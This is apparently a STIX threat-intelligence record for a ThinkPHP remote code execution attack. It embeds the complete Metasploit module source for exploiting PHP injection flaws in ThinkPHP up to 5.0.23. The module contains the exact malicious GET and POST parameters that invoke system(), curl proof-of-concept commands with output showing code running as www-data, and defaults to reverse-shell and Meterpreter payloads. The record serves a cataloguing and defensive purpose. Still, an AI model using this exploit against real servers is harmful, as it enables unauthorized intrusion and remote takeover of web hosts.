{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c7989c6-49a7-4fb0-8b93-f9de3186d80c",
    "created": "2024-08-14T17:12:00.613994Z",
    "modified": "2024-08-14T17:12:00.613998Z",
    "name": "ThinkPHP Multiple PHP Injection RCEs",
    "description": " This module exploits one of two PHP injection vulnerabilities in the ThinkPHP web framework to execute code as the web user.  Versions up to and including 5.0.23 are exploitable, though 5.0.23 is vulnerable to a separate vulnerability. The module will automatically attempt to detect the version of the software.  Tested against versions 5.0.20 and 5.0.23 as can be found on Vulhub. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/thinkphp_rce.rb",
            "external_id": "thinkphp_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ThinkPHP Multiple PHP Injection RCEs',\n        'Description' => %q{\n          This module exploits one of two PHP injection vulnerabilities in the\n          ThinkPHP web framework to execute code as the web user.\n\n          Versions up to and including 5.0.23 are exploitable, though 5.0.23 is\n          vulnerable to a separate vulnerability. The module will automatically\n          attempt to detect the version of the software.\n\n          Tested against versions 5.0.20 and 5.0.23 as can be found on Vulhub.\n        },\n        'Author' => [\n          # Discovered by unknown threaty threat actors\n          'wvu' # Module\n        ],\n        'References' => [\n          # https://www.google.com/search?q=thinkphp+rce, tbh\n          ['CVE', '2018-20062'], # NoneCMS 1.3 using ThinkPHP\n          ['CVE', '2019-9082'], # Open Source BMS 1.1.1 using ThinkPHP\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce'],\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce']\n        ],\n        'DisclosureDate' => '2018-12-10', # Unknown discovery date\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :curl,\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n\n    register_advanced_options([\n      # NOTE: You may want to tweak this for long-running commands like find(1)\n      OptFloat.new('CmdOutputTimeout',\n                   [true, 'Timeout for cmd/unix/generic output', 3.5])\n    ])\n  end\n\n  # PoC version check using the first <span> from the ThinkPHP copyright:\n  #\n  #   wvu@kharak:~$ curl -vs \"http://127.0.0.1:8080/index.php?s=$((RANDOM))\" | xmllint --html --xpath 'substring-after(//div[@class = \"copyright\"]/span[1]/text(), \"V\")' -\n  #   *   Trying 127.0.0.1...\n  #   * TCP_NODELAY set\n  #   * Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n  #   > GET /index.php?s=1353 HTTP/1.1\n  #   > Host: 127.0.0.1:8080\n  #   > User-Agent: curl/7.54.0\n  #   > Accept: */*\n  #   >\n  #   < HTTP/1.1 404 Not Found\n  #   < Date: Mon, 13 Apr 2020 06:42:15 GMT\n  #   < Server: Apache/2.4.25 (Debian)\n  #   < X-Powered-By: PHP/7.2.5\n  #   < Content-Length: 7332\n  #   < Content-Type: text/html; charset=utf-8\n  #   <\n  #   { [7332 bytes data]\n  #   * Connection #0 to host 127.0.0.1 left intact\n  #   5.0.20wvu@kharak:~$\n  def check\n    # An unknown route will trigger the ThinkPHP copyright with version\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        's' => rand_text_alpha(8..42)\n      }\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 404 && res.body.match(/copyright.*ThinkPHP/m)\n      return CheckCode::Unknown(\n        'Target did not respond with ThinkPHP copyright.'\n      )\n    end\n\n    # Get the first copyright <span> containing the version\n    version = res.get_html_document.at('//div[@class = \"copyright\"]/span')&.text\n\n    unless (version = version.scan(/^V([\\d.]+)$/).flatten.first)\n      return CheckCode::Detected(\n        'Target did not respond with ThinkPHP version.'\n      )\n    end\n\n    # Make the parsed version a comparable ivar for automatic exploitation\n    @version = Rex::Version.new(version)\n\n    if @version <= Rex::Version.new('5.0.23')\n      return CheckCode::Appears(\"ThinkPHP #{@version} is a vulnerable version.\")\n    end\n\n    CheckCode::Safe(\"ThinkPHP #{@version} is NOT a vulnerable version.\")\n  end\n\n  def exploit\n    # This is just extra insurance in case I screwed up the check method\n    unless @version\n      fail_with(Failure::NoTarget, 'Could not detect ThinkPHP version')\n    end\n\n    print_status(\"Targeting ThinkPHP #{@version} automatically\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # XXX: Only opts[:noconcat] may induce responses from the server\n      execute_cmdstager\n    else # This is just extra insurance in case I screwed up the info hash\n      fail_with(Failure::NoTarget, \"Could not select target #{target['Type']}\")\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    if @version < Rex::Version.new('5.0.23')\n      exploit_less_than_5_0_23(cmd)\n    elsif @version == Rex::Version.new('5.0.23')\n      exploit_5_0_23(cmd)\n    else # This is just extra insurance in case I screwed up the exploit method\n      fail_with(Failure::NoTarget, \"Could not target ThinkPHP #{@version}\")\n    end\n  end\n\n  # PoC for exploiting ThinkPHP < 5.0.23 to run the id(1) command with output:\n  #\n  #   wvu@kharak:~$ curl -gvs \"http://127.0.0.1:8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id\" | head -1\n  #   *   Trying 127.0.0.1...\n  #   * TCP_NODELAY set\n  #   * Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n  #   > GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1\n  #   > Host: 127.0.0.1:8080\n  #   > User-Agent: curl/7.54.0\n  #   > Accept: */*\n  #   >\n  #   < HTTP/1.1 200 OK\n  #   < Date: Mon, 13 Apr 2020 06:43:45 GMT\n  #   < Server: Apache/2.4.25 (Debian)\n  #   < X-Powered-By: PHP/7.2.5\n  #   < Vary: Accept-Encoding\n  #   < Transfer-Encoding: chunked\n  #   < Content-Type: text/html; charset=UTF-8\n  #   <\n  #   { [60 bytes data]\n  #   * Connection #0 to host 127.0.0.1 left intact\n  #   uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  #   wvu@kharak:~$\n  def exploit_less_than_5_0_23(cmd)\n    # XXX: The server may block on executing our payload and won't respond\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        's' => '/Index/\\\\think\\\\app/invokefunction',\n        'function' => 'call_user_func_array',\n        'vars[0]' => 'system', # TODO: Debug ARCH_PHP\n        'vars[1][]' => cmd\n      },\n      'partial' => true\n    }, datastore['CmdOutputTimeout'])\n\n    return unless res && res.code == 200\n\n    print_good(\"Successfully executed command: #{cmd}\")\n\n    return unless datastore['PAYLOAD'] == 'cmd/unix/generic'\n\n    # HACK: Print half of the doubled-up command output\n    vprint_line(res.body[0, res.body.length / 2])\n  end\n\n  # PoC for exploiting ThinkPHP 5.0.23 to run the id(1) command with output:\n  #\n  #   wvu@kharak:~$ curl -vsd \"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\" http://127.0.0.1:8081/index.php?s=captcha | head -1\n  #   *   Trying 127.0.0.1...\n  #   * TCP_NODELAY set\n  #   * Connected to 127.0.0.1 (127.0.0.1) port 8081 (#0)\n  #   > POST /index.php?s=captcha HTTP/1.1\n  #   > Host: 127.0.0.1:8081\n  #   > User-Agent: curl/7.54.0\n  #   > Accept: */*\n  #   > Content-Length: 72\n  #   > Content-Type: application/x-www-form-urlencoded\n  #   >\n  #   } [72 bytes data]\n  #   * upload completely sent off: 72 out of 72 bytes\n  #   < HTTP/1.1 200 OK\n  #   < Date: Mon, 13 Apr 2020 06:44:05 GMT\n  #   < Server: Apache/2.4.25 (Debian)\n  #   < X-Powered-By: PHP/7.2.12\n  #   < Vary: Accept-Encoding\n  #   < Transfer-Encoding: chunked\n  #   < Content-Type: text/html; charset=UTF-8\n  #   <\n  #   { [60 bytes data]\n  #   * Connection #0 to host 127.0.0.1 left intact\n  #   uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  #   wvu@kharak:~$\n  def exploit_5_0_23(cmd)\n    # XXX: The server may block on executing our payload and won't respond\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        's' => 'captcha'\n      },\n      'vars_post' => {\n        '_method' => '__construct',\n        'filter[]' => 'system', # TODO: Debug ARCH_PHP\n        'method' => 'get',\n        'server[REQUEST_METHOD]' => cmd\n      },\n      'partial' => true\n    }, datastore['CmdOutputTimeout'])\n\n    return unless res && res.code == 200\n\n    print_good(\"Successfully executed command: #{cmd}\")\n\n    return unless datastore['PAYLOAD'] == 'cmd/unix/generic'\n\n    # Clean up output from cmd/unix/generic\n    vprint_line(res.body.gsub(/\\n<!DOCTYPE html>.*/m, ''))\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-12-10, # Unknown discovery date",
    "x_mitre_platforms": [
        "linux'"
    ]
}